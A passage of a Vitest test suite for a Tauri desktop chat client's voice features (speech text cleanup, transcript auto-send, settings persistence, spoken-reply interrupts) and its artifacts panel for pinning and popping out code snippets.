      expect(speak('Partial ```python\nx = 1')).toBe(`Partial ${CODE_MSG}`)
    })

    it('speaks inline code as its literal text', () => {
      expect(speak('Run `bun install` now')).toBe('Run bun install now')
    })

    it('speaks links as their link text only', () => {
      expect(speak('See [the docs](https://example.com) please')).toBe('See the docs please')
    })

    it('speaks images as their alt text', () => {
      expect(speak('![a moon](moon.png) rises')).toBe('a moon rises')
    })

    it('strips heading, list, and emphasis markers', () => {
      expect(speak('## Heading\n- item one\n**bold** and _quiet_')).toBe('Heading item one bold and quiet')
    })

    it('strips blockquote markers', () => {
      expect(speak('> quoted wisdom here')).toBe('quoted wisdom here')
    })

    it('replaces a table with the table announcement', () => {
      expect(speak('| a | b |\n|---|---|\n| 1 | 2 |')).toBe(TABLE_MSG)
    })

    it('strips emoji', () => {
      expect(speak('Done! 🎉🚀')).toBe('Done!')
    })

    it('returns empty string when nothing speakable remains (caller skips speak_text)', () => {
      expect(speak('🎉  \n  ')).toBe('')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — transcript routing (fill/append + auto-send)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice transcript routing', () => {
    const M = () => (window as any).__MoonInternals
    // Transcripts only flow while voice is live (handleTranscript gates on
    // mode/micPaused — see the stop-while-transcribing scenarios below).
    const voiceLive = () => {
      const V = M().VoiceEngine
      V.available = true
      V.mode = 'auto'
      V.micPaused = false
      return V
    }

    it('Scenario: empty composer -> transcript fills and auto-sends via the EXACT existing send path (client info included)', () => {
      voiceLive()
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      M().State.activeThreadId = 'th-voice'
      const input = document.getElementById('message-input') as HTMLTextAreaElement
      input.value = ''

      M().VoiceEngine.handleTranscript('what time is it')

      // Sent through handleSubmit: input cleared, user bubble appended.
      expect(input.value).toBe('')
      const userMsgs = document.querySelectorAll('#chat-messages .msg.user')
      expect(userMsgs.length).toBe(1)
      expect(userMsgs[0].textContent).toBe('what time is it')
      // The same user-message frame the send button produces, incl. client info.
      expect(sendSpy).toHaveBeenCalledWith(expect.objectContaining({
        type: 'user-message',
        threadId: 'th-voice',
        text: 'what time is it',
        client: expect.objectContaining({ name: 'luna-moon' }),
      }))
    })

    it('Scenario: non-empty draft -> transcript appends with a space and does NOT send', () => {
      voiceLive()
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      const input = document.getElementById('message-input') as HTMLTextAreaElement
      input.value = 'remind me to'

      M().VoiceEngine.handleTranscript('water the plants')

      expect(input.value).toBe('remind me to water the plants')
      expect(sendSpy).not.toHaveBeenCalled()
      expect(document.querySelectorAll('#chat-messages .msg.user').length).toBe(0)
    })

    it('Scenario: a blank transcript is a no-op', () => {
      voiceLive()
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      M().VoiceEngine.handleTranscript('   ')
      expect(sendSpy).not.toHaveBeenCalled()
      expect(document.querySelectorAll('#chat-messages .msg.user').length).toBe(0)
    })

    // Regression (finding: stop-while-transcribing still auto-sent): a
    // transcript event that arrives AFTER voice was switched off — whisper
    // finished mid-teardown, or the event was already over the IPC bridge —
    // must be dropped, never auto-sent.
    it('Scenario: transcript arriving after voice was turned OFF is dropped', () => {
      const V = voiceLive()
      V.mode = 'off'
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      const input = document.getElementById('message-input') as HTMLTextAreaElement
      input.value = ''

      V.handleTranscript('captured speech the user stopped')

      expect(input.value).toBe('')
      expect(sendSpy).not.toHaveBeenCalled()
      expect(document.querySelectorAll('#chat-messages .msg.user').length).toBe(0)
    })

    it('Scenario: transcript arriving after the mic-pause click is dropped', () => {
      const V = voiceLive()
      V.micPaused = true   // the pause click is exactly "stop listening NOW"
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      const input = document.getElementById('message-input') as HTMLTextAreaElement
      input.value = ''

      V.handleTranscript('captured while pausing')

      expect(input.value).toBe('')
      expect(sendSpy).not.toHaveBeenCalled()
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — state events drive the moon + mic visuals
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice state -> moon visuals (data-voice-state)', () => {
    const V = () => (window as any).__MoonInternals.VoiceEngine

    it('Scenario: listening sets dataset.voiceState and the --voice-level CSS var (clamped)', () => {
      const wrapper = document.getElementById('moon-wrapper')!
      const mic = document.getElementById('voice-mic-btn')!

      V().onStateEvent({ state: 'listening', mode: 'auto', level: 0.5 })
      expect(wrapper.dataset.voiceState).toBe('listening')
      expect(wrapper.style.getPropertyValue('--voice-level')).toBe('0.5')
      expect(mic.dataset.voiceState).toBe('listening')

      V().onStateEvent({ state: 'listening', mode: 'auto', level: 3 })
      expect(wrapper.style.getPropertyValue('--voice-level')).toBe('1')
    })

    it('Scenario: transcribing and speaking map through; off clears to ""', () => {
      const wrapper = document.getElementById('moon-wrapper')!
      V().onStateEvent({ state: 'transcribing', mode: 'auto' })
      expect(wrapper.dataset.voiceState).toBe('transcribing')
      V().onStateEvent({ state: 'speaking', mode: 'auto' })
      expect(wrapper.dataset.voiceState).toBe('speaking')
      V().onStateEvent({ state: 'off', mode: 'off' })
      expect(wrapper.dataset.voiceState).toBe('')
      expect(document.getElementById('voice-mic-btn')!.dataset.voiceState).toBe('')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — Settings → Voice persistence + boot re-apply
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice settings persistence', () => {
    const M = () => (window as any).__MoonInternals

    // The shared beforeEach Tauri mock has no `core.invoke`; give each test one
    // (same convention as the thread-id and wizard suites above).
    function stubInvoke(impl?: (cmd: string, args?: any) => any) {
      const invoke = vi.fn(impl ?? (() => Promise.resolve(null)))
      ;(window as any).__TAURI__.core = { invoke }
      return invoke
    }

    it('Scenario: picking a mode persists luna_voice_mode and applies voice_set_mode', () => {
      const invoke = stubInvoke()
      M().VoiceEngine.setAvailable(true)   // jsdom boots voice-unavailable; enable the controls
      const autoBtn = document.querySelector('.voice-mode-btn[data-voice-mode="auto"]') as HTMLButtonElement
      autoBtn.click()

      expect(localStorage.getItem('luna_voice_mode')).toBe('auto')
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
      expect(autoBtn.classList.contains('active')).toBe(true)
      expect(autoBtn.getAttribute('aria-checked')).toBe('true')
    })

    it('Scenario: turning Speak replies off persists "0"', () => {
      stubInvoke()
      M().VoiceEngine.setAvailable(true)
      const toggle = document.getElementById('voice-speak-replies-toggle') as HTMLInputElement
      toggle.checked = false
      toggle.dispatchEvent(new Event('change', { bubbles: true }))
      expect(localStorage.getItem('luna_voice_speak_replies')).toBe('0')
      expect(M().VoiceEngine.speakReplies).toBe(false)
    })

    it('Scenario: the silence-hang slider live-updates its label and persists on change', () => {
      const invoke = stubInvoke()
      M().VoiceEngine.setAvailable(true)
      const slider = document.getElementById('voice-silence-slider') as HTMLInputElement
      slider.value = '900'
      slider.dispatchEvent(new Event('input', { bubbles: true }))
      expect(document.getElementById('voice-silence-value')!.textContent).toBe('900')
      slider.dispatchEvent(new Event('change', { bubbles: true }))
      expect(localStorage.getItem('luna_voice_silence_hang_ms')).toBe('900')
      expect(invoke).toHaveBeenCalledWith('voice_set_config', { silenceHangMs: 900 })
    })

    it('Scenario: persisted settings round-trip back into the controls via loadSettings', () => {
      localStorage.setItem('luna_voice_mode', 'ptt')
      localStorage.setItem('luna_voice_speak_replies', '0')
      localStorage.setItem('luna_voice_silence_hang_ms', '750')
      localStorage.setItem('luna_voice_id', 'com.apple.voice.premium.en-US.Zoe')

      M().VoiceEngine.loadSettings()

      expect(M().VoiceEngine.mode).toBe('ptt')
      const pttBtn = document.querySelector('.voice-mode-btn[data-voice-mode="ptt"]')!
      expect(pttBtn.classList.contains('active')).toBe(true)
      expect((document.getElementById('voice-speak-replies-toggle') as HTMLInputElement).checked).toBe(false)
      expect((document.getElementById('voice-silence-slider') as HTMLInputElement).value).toBe('750')
      expect(document.getElementById('voice-silence-value')!.textContent).toBe('750')
      // The persisted voice id survives even before voice_list_voices populates.
      const sel = document.getElementById('voice-voice-select') as HTMLSelectElement
      expect(sel.value).toBe('com.apple.voice.premium.en-US.Zoe')
    })

    it('Scenario: a stored out-of-range silence hang is clamped on load', () => {
      localStorage.setItem('luna_voice_silence_hang_ms', '99999')
      M().VoiceEngine.loadSettings()
      expect(M().VoiceEngine.silenceHangMs).toBe(1200)
    })

    it('Scenario: voice picker populates from voice_list_voices with quality tags and persists luna_voice_id', async () => {
      stubInvoke((cmd) => Promise.resolve(
        cmd === 'voice_list_voices'
          ? [
              { id: 'v1', name: 'Samantha', lang: 'en-US', quality: 'premium' },
              { id: 'v2', name: 'Fred', lang: 'en-US', quality: 'default' },
            ]
          : null
      ))
      M().VoiceEngine.setAvailable(true)
      await M().VoiceEngine.populateVoices()

      const sel = document.getElementById('voice-voice-select') as HTMLSelectElement
      const labels = Array.from(sel.options).map((o) => o.textContent)
      expect(labels).toContain('Samantha · premium')
      expect(labels).toContain('Fred')                    // "default" quality is untagged
      expect(labels[0]).toBe('System default')

      sel.value = 'v1'
      sel.dispatchEvent(new Event('change', { bubbles: true }))
      expect(localStorage.getItem('luna_voice_id')).toBe('v1')
    })

    // Regression (finding: "System default" never reached Rust): the empty
    // id IS the engine's explicit reset command — guarding the invoke on a
    // truthy id left the previously pinned voice speaking until restart.
    it('Scenario: picking "System default" (empty id) still invokes voice_set_voice with id ""', async () => {
      const invoke = stubInvoke((cmd) => Promise.resolve(
        cmd === 'voice_list_voices'
          ? [{ id: 'v1', name: 'Samantha', lang: 'en-US', quality: 'premium' }]
          : null
      ))
      const V = M().VoiceEngine
      V.setAvailable(true)
      V.voiceId = 'v1'
      localStorage.setItem('luna_voice_id', 'v1')
      await V.populateVoices()
      const sel = document.getElementById('voice-voice-select') as HTMLSelectElement
      expect(sel.value).toBe('v1')

      sel.value = ''
      sel.dispatchEvent(new Event('change', { bubbles: true }))

      expect(localStorage.getItem('luna_voice_id')).toBeNull()
      expect(invoke).toHaveBeenCalledWith('voice_set_voice', { id: '' })
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — spoken replies pipeline + interrupts
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice spoken replies pipeline', () => {
    const M = () => (window as any).__MoonInternals

    function voiceOn() {
      const invoke = vi.fn().mockResolvedValue(null)
      ;(window as any).__TAURI__.core = { invoke }
      const V = M().VoiceEngine
      V.available = true
      V.mode = 'auto'
      V.speakReplies = true
      return { invoke, V }
    }
    const spoken = (invoke: any) =>
      invoke.mock.calls.filter((c: any[]) => c[0] === 'speak_text').map((c: any[]) => c[1].text)
    const called = (invoke: any, cmd: string) =>
      invoke.mock.calls.some((c: any[]) => c[0] === cmd)

    it('Scenario: cumulative deltas speak each sentence as it completes; assistant-done flushes the remainder', () => {
      const { invoke } = voiceOn()
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hello there. How' })
      expect(spoken(invoke)).toEqual(['Hello there.'])
      // CUMULATIVE wire contract: the next delta re-sends the prefix.
      M().handleFrame({ type: 'assistant-delta', turnId: 't1', text: 'Hello there. How are you? I' })
      expect(spoken(invoke)).toEqual(['Hello there.', 'How are you?'])
      M().handleFrame({ type: 'assistant-done', turnId: 't1' })
      expect(spoken(invoke)).toEqual(['Hello there.', 'How are you?', 'I'])
    })

    it('Scenario: a code fence streams as one chunk and is spoken as the announcement', () => {
      const { invoke } = voiceOn()
      M().handleFrame({
        type: 'assistant-delta', turnId: 't1',
        text: 'Look at this. ```js\nfoo(); // first. second\n``` All done. ',
      })
      expect(spoken(invoke)).toEqual([
        'Look at this.',
        "I've put the code in the chat. All done.",
      ])
    })

    it('Scenario: turn-complete is a safety flush for anything still buffered', () => {
      const { invoke } = voiceOn()
      M().handleFrame({ type: 'assistant-delta', turnId: 't2', text: 'Partial answer without ending' })
      expect(spoken(invoke)).toEqual([])
      M().handleFrame({ type: 'turn-complete' })
      expect(spoken(invoke)).toEqual(['Partial answer without ending'])
    })

    it('Scenario: nothing is spoken when speakReplies is off or mode is off', () => {
      const { invoke, V } = voiceOn()
      V.speakReplies = false
      M().handleFrame({ type: 'assistant-delta', turnId: 't3', text: 'Quiet please. More' })
      V.speakReplies = true
      V.mode = 'off'
      M().handleFrame({ type: 'assistant-delta', turnId: 't3', text: 'Quiet please. More words. Tail' })
      expect(spoken(invoke)).toEqual([])
    })

    it('Scenario: a new user send stops speaking (voice_stop_speaking) and drops queued speech', () => {
      const { invoke, V } = voiceOn()
      M().handleFrame({ type: 'assistant-delta', turnId: 't4', text: 'Old answer still buffering' })
      const input = document.getElementById('message-input') as HTMLTextAreaElement
      input.value = 'never mind'
      document.getElementById('chat-form')!.dispatchEvent(
        new Event('submit', { bubbles: true, cancelable: true })
      )
      expect(called(invoke, 'voice_stop_speaking')).toBe(true)
      // The superseded turn's buffer was dropped: a later flush speaks nothing.
      M().handleFrame({ type: 'turn-complete' })
      expect(spoken(invoke)).toEqual([])
      expect(V.state).toBeDefined()
    })

    it('Scenario: Esc stops the spoken reply while speaking', () => {
      const { invoke, V } = voiceOn()
      V.state = 'speaking'
      window.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))
      expect(called(invoke, 'voice_stop_speaking')).toBe(true)
    })

    // Regression (finding: Esc gated on state==='speaking'): after a pipeline
    // error the thread is dead and NOTHING re-emits 'speaking', yet
    // speak_text still plays replies — Esc must stay able to silence them
    // (VOICE.md lists Esc unconditionally in the stop-speaking triad).
    it('Scenario: Esc stops speech regardless of reported state (pipeline-error case)', () => {
      const { invoke, V } = voiceOn()
      V.state = 'error'
      // Direct call (window dispatch would also wake superseded script runs
      // from earlier tests, which share this jsdom window).
      V.handleEscape()
      expect(called(invoke, 'voice_stop_speaking')).toBe(true)
    })

    it('Scenario: Esc is a no-op only when voice is unavailable', () => {
      const { invoke, V } = voiceOn()
      V.available = false
      V.handleEscape()
      expect(called(invoke, 'voice_stop_speaking')).toBe(false)
    })

    // Regression (finding: TABLE_MSG once per row): rows with sentence
    // punctuation inside cells stream as ONE chunk → ONE announcement.
    it('Scenario: a streamed markdown table is announced ONCE, not once per row', () => {
      const { invoke } = voiceOn()
      M().handleFrame({
        type: 'assistant-delta', turnId: 'tt',
        text: 'Here you go.\n| a | first. row |\n| b | second. row |\nDone now. ',
      })
      expect(spoken(invoke)).toEqual([
        'Here you go.',
        "There's a table in the chat. Done now.",
      ])
    })

    it('Scenario: mic click toggles hands-free listening WITHOUT rewriting the persisted preference', () => {
      const { invoke } = voiceOn()
      const mic = document.getElementById('voice-mic-btn')!
      mic.dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'off' })   // pause
      mic.dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })  // resume
      expect(localStorage.getItem('luna_voice_mode')).toBeNull()               // runtime-only
    })

    it('Scenario: press-and-hold on the mic is push-to-talk in ptt mode', () => {
      const { invoke, V } = voiceOn()
      V.mode = 'ptt'
      const mic = document.getElementById('voice-mic-btn')!
      mic.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true }))
      expect(called(invoke, 'voice_ptt_down')).toBe(true)
      expect(called(invoke, 'voice_ptt_up')).toBe(false)
      window.dispatchEvent(new MouseEvent('pointerup', { bubbles: true }))
      expect(called(invoke, 'voice_ptt_up')).toBe(true)
    })

    it('Scenario: voice-error surfaces a non-blocking transcript banner', () => {
      voiceOn()
      M().VoiceEngine.onVoiceError({ message: 'Microphone permission denied' })
      expect(document.getElementById('chat-messages')!.textContent)
        .toContain('Voice: Microphone permission denied')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — availability probe + boot wiring
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice availability + boot wiring', () => {
    const M = () => (window as any).__MoonInternals

    it('Scenario: without a Tauri voice backend the section degrades (mic hidden, controls disabled, note shown)', () => {
      // The shared beforeEach has no __TAURI__.core: VoiceEngine.init() lands
      // in "unavailable" synchronously at boot.
      expect(document.getElementById('voice-mic-btn')!.hidden).toBe(true)
      expect(document.getElementById('voice-unavailable-note')!.hidden).toBe(false)
      expect((document.getElementById('voice-silence-slider') as HTMLInputElement).disabled).toBe(true)
      expect((document.querySelector('.voice-mode-btn') as HTMLButtonElement).disabled).toBe(true)
      expect(document.getElementById('voice-model-status')!.textContent).toBe('Unavailable in this build')
    })

    it('Scenario: a Rust core whose voice_status REJECTS (older build) degrades silently, no throw', async () => {
      const invoke = vi.fn().mockRejectedValue(new Error('unknown command voice_status'))
      ;(window as any).__TAURI__.core = { invoke }
      await M().VoiceEngine.init()
      expect(M().VoiceEngine.available).toBe(false)
      expect(document.getElementById('voice-mic-btn')!.hidden).toBe(true)
      expect(document.getElementById('voice-unavailable-note')!.hidden).toBe(false)
      // Only the probe was attempted — no follow-up voice commands to spam.
      expect(invoke.mock.calls.map((c) => c[0])).toEqual(['voice_status'])
    })

    it('Scenario: with a voice backend, boot probes status, subscribes events, re-applies persisted settings, lists voices', async () => {
      localStorage.setItem('luna_voice_mode', 'auto')
      localStorage.setItem('luna_voice_silence_hang_ms', '800')
      const handlers: Record<string, (e: any) => void> = {}
      const invoke = vi.fn(async (cmd: string) => {
        if (cmd === 'voice_status') return { state: 'idle', mode: 'off', modelPresent: true }
        if (cmd === 'voice_list_voices') return [{ id: 'v1', name: 'Samantha', lang: 'en-US', quality: 'enhanced' }]
        return null
      })
      const listen = vi.fn(async (name: string, cb: any) => { handlers[name] = cb; return () => {} })
      ;(window as any).__TAURI__.core = { invoke }
      ;(window as any).__TAURI__.event = { listen }

      await M().VoiceEngine.init()

      expect(invoke).toHaveBeenCalledWith('voice_status')
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
      expect(invoke).toHaveBeenCalledWith('voice_set_config', { silenceHangMs: 800 })
      expect(Object.keys(handlers)).toEqual(expect.arrayContaining([
        'voice-state', 'voice-transcript', 'voice-model-progress', 'voice-error',
      ]))
      expect(document.getElementById('voice-mic-btn')!.hidden).toBe(false)
      expect(document.getElementById('voice-model-status')!.textContent).toContain('ready')
      const sel = document.getElementById('voice-voice-select') as HTMLSelectElement
      expect(Array.from(sel.options).some((o) => o.textContent === 'Samantha · enhanced')).toBe(true)

      // A captured voice-transcript event routes through the real send path.
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      M().State.activeThreadId = 'th-boot'
      handlers['voice-transcript']({ payload: { text: 'hello from voice', final: true } })
      expect(sendSpy).toHaveBeenCalledWith(expect.objectContaining({
        type: 'user-message', text: 'hello from voice',
      }))
    })

    it('Scenario: model-progress events drive the download bar; done marks the model ready', () => {
      const V = M().VoiceEngine
      V.onModelProgress({ downloadedBytes: 50 * 1024 * 1024, totalBytes: 100 * 1024 * 1024, done: false })
      const bar = document.getElementById('voice-model-progress')!
      expect(bar.hidden).toBe(false)
      expect((document.getElementById('voice-model-progress-fill') as HTMLElement).style.width).toBe('50%')
      expect(document.getElementById('voice-model-status')!.textContent).toContain('50.0 / 100.0 MB')

      V.onModelProgress({ done: true })
      expect(document.getElementById('voice-model-status')!.textContent).toContain('Model ready')
      expect(bar.hidden).toBe(true)
      expect(document.getElementById('voice-model-download')!.hidden).toBe(true)
    })

    it('Scenario: a failed model download re-arms the Download button', () => {
      const V = M().VoiceEngine
      V.onModelProgress({ downloadedBytes: 0, totalBytes: 0, done: false, error: 'network unreachable' })
      expect(document.getElementById('voice-model-status')!.textContent).toContain('network unreachable')
      expect(document.getElementById('voice-model-download')!.hidden).toBe(false)
      expect(document.getElementById('voice-model-progress')!.hidden).toBe(true)
    })

    // Regression (finding: after model download the pipeline stayed off while
    // the UI showed Hands-free active): mod.rs's contract is "the frontend
    // drives voice_ensure_model first, then RETRIES" — so a successful
    // download must re-apply the chosen mode.
    it('Scenario: a successful model download re-applies the chosen voice mode', async () => {
      const invoke = vi.fn(async (cmd: string, args?: any) => {
        if (cmd === 'voice_set_mode') {
          return { state: 'idle', mode: args.mode, modelPresent: true, silenceHangMs: 600 }
        }
        return null
      })
      ;(window as any).__TAURI__.core = { invoke }
      const V = M().VoiceEngine
      V.available = true
      V.mode = 'auto'
      V.micPaused = true   // the refused pre-download set_mode parked the mic

      await V.startModelDownload()

      expect(invoke).toHaveBeenCalledWith('voice_ensure_model')
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
      expect(V.micPaused).toBe(false)
      expect(V.rustMode).toBe('auto')
      expect(document.getElementById('voice-model-status')!.textContent).toContain('Model ready')
    })

    // Regression (finding: inverted first mic click): when Rust REFUSES a
    // mode (model missing → VoiceStatus.mode 'off'), the engine must park
    // the mic so the next click RESUMES (set_mode 'auto') instead of
    // "pausing" a pipeline that was never live.
    it('Scenario: a refused voice_set_mode parks the mic; the first mic click resumes', async () => {
      const invoke = vi.fn(async (cmd: string) => {
        if (cmd === 'voice_set_mode') {
          return { state: 'off', mode: 'off', modelPresent: false, silenceHangMs: 600 }
        }
        return null
      })
      ;(window as any).__TAURI__.core = { invoke }
      const V = M().VoiceEngine
      V.available = true

      V.setMode('auto')                          // user clicks Hands-free, no model yet
      await Promise.resolve(); await Promise.resolve(); await Promise.resolve()
      expect(V.micPaused).toBe(true)
      expect(V.rustMode).toBe('off')

      invoke.mockClear()
      V.onMicClick()                             // first click must START voice…
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
      expect(invoke).not.toHaveBeenCalledWith('voice_set_mode', { mode: 'off' })  // …not "pause" it
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — hidden-attribute CSS overrides (regression)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice hidden-attribute CSS overrides', () => {
    // jsdom computes no layout, so the DOM-property assertions elsewhere
    // cannot catch this class of bug: the UA's `[hidden] {display:none}` is
    // NON-important, so ANY author `display:` rule on the same element wins
    // by cascade — .close-btn{display:flex} kept the dead mic button visible
    // and .setting-item{display:flex} kept the "Voice isn't available" note
    // visible in every real (WebKit) build. Assert the !important overrides
    // exist in the stylesheet source.
    it('mic button: .mic-btn[hidden] forces display:none over .close-btn display:flex', () => {
      expect(htmlContent).toMatch(/\.mic-btn\[hidden\]\s*\{\s*display:\s*none\s*!important/)
    })

    it('settings rows: .setting-item[hidden] forces display:none over display:flex', () => {
      expect(htmlContent).toMatch(/\.setting-item\[hidden\]\s*\{\s*display:\s*none\s*!important/)
    })

    it('the voice-unavailable note and mic button still carry the hidden attribute by default', () => {
      // The override only matters because both elements SHIP hidden and are
      // toggled via the property; keep that contract pinned.
      expect(htmlContent).toMatch(/id="voice-unavailable-note"[^>]*hidden/)
      expect(htmlContent).toMatch(/id="voice-mic-btn"[^>]*hidden/)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Artifacts panel (PRD Part C W1)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Artifacts panel', () => {
    const M = () => (window as any).__MoonInternals
    const sentFrames: any[] = []

    beforeEach(() => {
      sentFrames.length = 0
      const m = M()
      m.WebSocketEngine.send = (f: any) => { sentFrames.push(f) }
      m.State.ws = { readyState: WebSocket.OPEN }
      m.State.pinnedArtifacts = []
      m.State.sessionArtifacts = []
      m.State.artifactsPanelOpen = false
      m.State.serverSupportsArtifacts = false
      m.ArtifactsEngine._selectedId = null
      // Ensure the panel is closed and button is hidden at the start of each test.
      const panel = document.getElementById('artifacts-panel')
      if (panel) panel.hidden = true
      const btn = document.getElementById('artifacts-btn')
      if (btn) (btn as HTMLElement).hidden = true
    })

    it('(a) applyPinned populates State and render() lists them in the pinned section', () => {
      const m = M()
      // The panel must be open for the list to be rendered.
      m.ArtifactsEngine.openPanel()

      m.ArtifactsEngine.applyPinned([
        { id: 'pin-1', kind: 'code', title: 'My Script', lang: 'python', content: 'print("hi")',
          origin: null, version: 2, pinnedAt: 1, updatedAt: 1 },
        { id: 'pin-2', kind: 'markdown', title: 'Notes', lang: null, content: '# Hello',
          origin: null, version: 1, pinnedAt: 1, updatedAt: 1 },
      ])

      expect(m.State.pinnedArtifacts).toHaveLength(2)
      const pinnedSection = document.getElementById('artifacts-pinned-section')!
      expect(pinnedSection.hidden).toBe(false)
      const rows = document.querySelectorAll('#artifacts-pinned-list .artifact-row')
      expect(rows.length).toBe(2)
      expect(rows[0]!.textContent).toContain('My Script')
      expect(rows[0]!.textContent).toContain('code')
      expect(rows[0]!.textContent).toContain('v2')
      expect(rows[1]!.textContent).toContain('Notes')

      // Badge shows count of pinned artifacts.
      const badge = document.getElementById('artifacts-badge')!
      expect(badge.hidden).toBe(false)
      expect(badge.textContent).toBe('2')
    })

    it('(b) clicking Pin in the session list sends an artifact-pin frame', () => {
      const m = M()
      m.ArtifactsEngine.openPanel()

      // Inject a session artifact via the frame pipeline.
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted',
        threadId: 'th-1',
        messageId: 'msg-1',
        messageSeq: 0,
        artifacts: [
          { id: 'msg-1:0', source: 'code-fence', path: null, lang: 'js',
            title: 'Snippet', content: 'console.log(42)' },
        ],
      })

      const sessionList = document.getElementById('artifacts-session-list')!
      const pinBtn = sessionList.querySelector('.artifact-row-btn') as HTMLButtonElement
      expect(pinBtn).not.toBeNull()
      expect(pinBtn.textContent).toBe('Pin')
      pinBtn.click()

      expect(sentFrames).toHaveLength(1)
      expect(sentFrames[0]).toMatchObject({
        type: 'artifact-pin',
        id: 'msg-1:0',
        title: 'Snippet',
        content: 'console.log(42)',
        lang: 'js',
      })
    })

    it('(c) applyCapability(false) hides the header button and clears pinned/session state', () => {
      const m = M()
      // First seed some state and reveal the button.
      m.ArtifactsEngine.applyCapability(true)
      m.ArtifactsEngine.applyPinned([
        { id: 'x', kind: 'code', title: 'X', lang: null, content: 'a', origin: null, version: 1, pinnedAt: 1, updatedAt: 1 },
      ])
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted', threadId: 't', messageId: 'msg-x', messageSeq: 0,
        artifacts: [{ id: 'msg-x:0', source: 'code-fence', path: null, lang: 'sh', title: 'sh', content: 'ls' }],
      })
      m.ArtifactsEngine.openPanel()
      expect(m.State.pinnedArtifacts).toHaveLength(1)
      expect(m.State.sessionArtifacts).toHaveLength(1)
      expect(m.State.artifactsPanelOpen).toBe(true)

      const btn = document.getElementById('artifacts-btn')!
      expect((btn as HTMLElement).hidden).toBe(false)

      // Simulate connecting to an old server without artifacts support.
      m.handleFrame({ type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true } })

      expect(m.State.serverSupportsArtifacts).toBe(false)
      expect(m.State.pinnedArtifacts).toHaveLength(0)
      expect(m.State.sessionArtifacts).toHaveLength(0)
      expect(m.State.artifactsPanelOpen).toBe(false)
      expect((document.getElementById('artifacts-btn')! as HTMLElement).hidden).toBe(true)
    })

    it('(d) applySession dedups by messageId prefix — re-delivered turns replace their own artifacts', () => {
      const m = M()
      // First delivery: msg-2 produces 2 artifacts.
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted', threadId: 't', messageId: 'msg-2', messageSeq: 0,
        artifacts: [
          { id: 'msg-2:0', source: 'code-fence', path: null, lang: 'py', title: 'v1', content: 'a' },
          { id: 'msg-2:1', source: 'code-fence', path: null, lang: 'py', title: 'v1b', content: 'b' },
        ],
      })
      expect(m.State.sessionArtifacts).toHaveLength(2)

      // Second delivery: same messageId — replaces both prior.
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted', threadId: 't', messageId: 'msg-2', messageSeq: 0,
        artifacts: [
          { id: 'msg-2:0', source: 'code-fence', path: null, lang: 'py', title: 'v2', content: 'c' },
        ],
      })
      // Only 1 artifact remains — the re-delivered msg-2:0 with title 'v2'.
      expect(m.State.sessionArtifacts).toHaveLength(1)
      expect(m.State.sessionArtifacts[0].title).toBe('v2')

      // A different messageId is NOT affected by the dedup.
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted', threadId: 't', messageId: 'msg-3', messageSeq: 1,
        artifacts: [
          { id: 'msg-3:0', source: 'code-fence', path: null, lang: 'ts', title: 'other', content: 'd' },
        ],
      })
      expect(m.State.sessionArtifacts).toHaveLength(2)
      expect(m.State.sessionArtifacts.map((a: any) => a.id)).toEqual(['msg-2:0', 'msg-3:0'])
    })

    it('(e) pop-out button on a pinned artifact invokes open_artifact_widget when Tauri is present', async () => {
      const m = M()
      // Seed __TAURI__.core.invoke mock (list_widget_windows feeds the
      // cascade-position math; empty deck → first slot).
      const invokeMock = vi.fn(async (cmd: string) =>
        cmd === 'list_widget_windows' ? [] : undefined)
      ;(window as any).__TAURI__ = {
        ...(window as any).__TAURI__,
        core: { invoke: invokeMock },
      }

      m.ArtifactsEngine.openPanel()
      m.ArtifactsEngine.applyPinned([
        { id: 'pin-pop', kind: 'code', title: 'deploy.sh', lang: 'sh', content: 'echo hi',
          origin: null, version: 3, pinnedAt: 1, updatedAt: 1 },
      ])

      const pinnedList = document.getElementById('artifacts-pinned-list')!
      const popBtn = pinnedList.querySelector('[data-action="pop-out"]') as HTMLButtonElement
      expect(popBtn).not.toBeNull()
      expect(popBtn.textContent).toBe('⤢')

      popBtn.click()
      await vi.advanceTimersByTimeAsync(1) // the handler awaits the deck census

      expect(invokeMock).toHaveBeenCalledWith('list_widget_windows')
